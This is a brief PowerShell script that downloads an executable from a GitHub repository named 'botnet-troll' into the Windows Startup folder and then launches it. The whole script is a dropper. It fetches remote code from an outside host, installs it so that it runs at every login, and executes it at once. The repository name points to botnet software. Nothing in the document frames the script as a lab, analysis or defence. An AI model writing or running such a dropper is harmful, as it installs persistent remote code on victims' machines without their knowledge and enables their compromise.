# download https://github.com/Hamy-os/botnet-troll/blob/main/output/main.exe?raw=true into shell:startup

$webclient = New-Object System.Net.WebClient
$webclient.DownloadFile("https://github.com/Hamy-os/botnet-troll/blob/main/output/main.exe?raw=true", "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\main.exe")


# run the file
Start-Process "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\main.exe"